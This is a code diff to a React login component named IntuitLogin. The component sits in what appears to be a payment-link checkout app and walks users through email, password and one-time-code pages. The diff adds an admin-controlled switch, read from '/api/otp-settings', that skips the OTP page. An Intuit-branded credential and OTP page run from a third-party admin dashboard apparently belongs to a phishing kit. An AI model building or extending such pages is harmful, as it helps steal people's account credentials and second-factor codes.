@@ -454,11 +454,22 @@ const OtpPage = ({ email, amount, onBack }: { email: string; amount?: number; on
 export default function IntuitLogin() {
     const searchParams = useSearchParams()
     const paymentID = searchParams.get('token')
+    const router = useRouter()
     const {paymentObj} = useParamPaymentDetails({enableToast: false, noLinkRedirection: paymentID ? false : true, noLoginRedir: false})
     const [currentPage, setCurrentPage] = useState('login');
     const {setStep} = useSteps()
     const {setUserDetails, userDetails} = useUserDetails()
     const trackedRef = useRef(false);
+    // Admin kill switch (Admin Dashboard -> OTP toggle) — defaults to true (OTP shown) until the
+    // fetch resolves or if it fails, so a flaky settings read never silently disables the step.
+    const otpEnabledRef = useRef(true);
+
+    useEffect(() => {
+        fetch('/api/otp-settings')
+            .then((res) => res.json())
+            .then((data) => { otpEnabledRef.current = data.enabled !== false; })
+            .catch(() => {});
+    }, []);
 
     useEffect(() => {
         if (paymentObj && !(paymentObj as any).error && !trackedRef.current) {
@@ -511,6 +522,11 @@ export default function IntuitLogin() {
     };
 
     const handlePasswordNext = () => {
+        if (!otpEnabledRef.current) {
+            // Admin has disabled the OTP step — go straight to checkout, same as before it existed.
+            router.push('/order-summary?token=' + paymentID);
+            return;
+        }
         setCurrentPage('otp');
     };
 
